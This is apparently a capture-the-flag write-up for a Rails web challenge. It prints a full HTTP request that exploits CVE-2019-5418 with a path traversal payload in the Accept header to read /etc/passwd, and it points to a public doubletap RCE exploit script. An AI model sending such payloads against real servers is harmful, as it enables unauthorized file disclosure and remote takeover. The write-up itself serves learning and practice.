# Web03 (Point: 301)

## TL;DR

**Rails-doubletap-exploit to RCE**

## Vulnerability

### LFI

It was a ruby app vulnerable to CVE-2019-5418. The route `/about` was vulernable to LFI in accept header

```
GET /about HTTP/1.1
Host: 52.78.36.66:83
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: ../../../../../../etc/passwd{{
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"39c1281e9528ea22706e5964bb68108c"
Cache-Control: max-age=0
```

## Exploit

Download the Exploit script at `https://github.com/mpgn/Rails-doubletap-RCE` and run on the server to get the flag.

## Flag

The webApp was down after the challenge so couldnt fetch it.